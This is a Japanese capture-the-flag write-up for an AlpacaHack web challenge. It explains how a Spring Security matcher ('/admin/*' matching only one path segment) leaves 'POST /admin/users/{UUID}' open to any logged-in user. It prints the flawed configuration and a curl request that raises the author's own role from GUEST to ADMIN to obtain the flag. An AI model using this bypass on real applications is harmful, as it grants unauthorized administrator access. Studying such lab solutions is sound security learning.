# Springing (2026/8/29-31)

AlpacaHack初のWriteupです。温かい目で見てください。

## 問題

🌸🌸🌸🌸🌸🌸🌸

## 概要

とりあえずリンクを見てみると、ごく普通のログインページがある。

<img width="646" height="274" alt="image" src="https://github.com/MooseLoveti/Alpaca-Writeup/blob/main/image/form.png" />

registerとあるため、単純なSQLiなどでadminにログインする流れでは無さそう。

適当なユーザー名とパスワードを入力して登録し、ログインできた。UUIDらしきものが設定されている。

<img width="630" height="361" alt="image" src="https://github.com/MooseLoveti/Alpaca-Writeup/blob/main/image/uuid.png" />

GUESTとあるから、これをADMINにするために何らかのアクションをする必要があるのだろう。

ここで少しソースコードを見てみる。`AdminController.java`に以下のようなコードを見つけた。

```java
@Controller
public class AdminController {
    private final UserService users;

    public AdminController(UserService users) {
        this.users = users;
    }

    @GetMapping("/admin")
    public String index(Model model) {
        var flag = "Alpaca{REDACTED}";
        model.addAttribute("flag", flag);
        return "admin/index";
    }

    @GetMapping("/admin/users")
    public String userList(Model model) {
        model.addAttribute("users", users.findAll());
        return "admin/users";
    }

    @PostMapping("/admin/users/{userid}")
    public ResponseEntity<Void> changeRole(
            @PathVariable UUID userid,
            @RequestParam String role) {
        users.changeRole(userid, role)
                .orElseThrow(() -> new ResponseStatusException(NOT_FOUND, "user not found"));
        return ResponseEntity.status(SEE_OTHER)
                .location(URI.create("/admin/users"))
                .build();
    }

}
```

`/admin`、`/admin/users`なんてものがある。ひょっとして認可制御ミスかな？と思ってアクセスしてみたが

<img width="1024" height="256" alt="image" src="https://github.com/MooseLoveti/Alpaca-Writeup/blob/main/image/403.png" />

普通に権限が無く失敗。`SecurityConfig.java`に認可処理が書かれているとのこと。見てみよう。

## 認可不備

```java
public class SecurityConfig {
    @Bean
    SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
                .csrf(AbstractHttpConfigurer::disable)
                .authorizeHttpRequests(authorize -> authorize
                        .requestMatchers("/user/login", "/user/register").permitAll()
                        .requestMatchers("/admin", "/admin/*").hasRole("ADMIN")
                        .anyRequest().authenticated())
                .formLogin(form -> form
                        .loginPage("/user/login")
                        .defaultSuccessUrl("/", true))
                .logout(logout -> logout
                        .logoutUrl("/user/logout")
                        .logoutSuccessUrl("/user/login"));
        return http.build();
    }

    @Bean
    PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

見る限り、問題がありそうなのは

```java
.requestMatchers("/admin", "/admin/*").hasRole("ADMIN")
.anyRequest().authenticated())
```

この部分だろう。`/admin`へのアクセス、そして`/admin/*`へのアクセスはADMIN権限がない限り権限エラーとなるよう設定されている。

しかし、`*`は`/`をまたがない一層分のみマッチするため、`/admin/users/{UUID}`は`/admin/*`にマッチしない。

対象外となったリクエストは後続の`.anyRequest().authenticated()`によって処理される。ここではADMIN権限ではなく、ログイン済みであることしか要求されないため、GUESTユーザーでも`POST /admin/users/{UUID}`へアクセスできてしまう。

よって、自分のUUIDでアクセスし、ロールを変えてしまおう。

`AdminController.java`より、

- `/admin/users/{userid}` はPOSTで処理される
- `userid` はURLのパスパラメータとして指定する
- `role` はリクエストパラメータとして指定する

ことが分かるため、curlを用いてリクエストを送信する。

## 解法

```shell
curl -i -X POST \
  -b 'JSESSIONID={自分のセッション値}' \
  -d 'role=ADMIN' \
  'http://34.170.146.252:37059/admin/users/{自分のUUID}'
```

こちらを実行することで、自身の権限をGUESTからADMINに変更できる。ページに戻ると、正しく権限がADMINに変更されていることが分かる。

しかし、現在のセッションに保持されているSpring Securityの`SecurityContext`には、ログイン時に生成された`ROLE_GUEST`の認証情報が残っている。そのため、このままでは`/admin`へアクセスしても403となる。

一度ログアウトして再ログインすることで認証情報を再生成し、新しい`ROLE_ADMIN`を反映させる必要がある。

再ログイン後、`/admin`にアクセスすると、フラグが表示された。

<img width="648" height="255" alt="image" src="https://github.com/MooseLoveti/Alpaca-Writeup/blob/main/image/flag.png" />


Flag : `Alpaca{p0yoyoyoyoyoyo----n}`
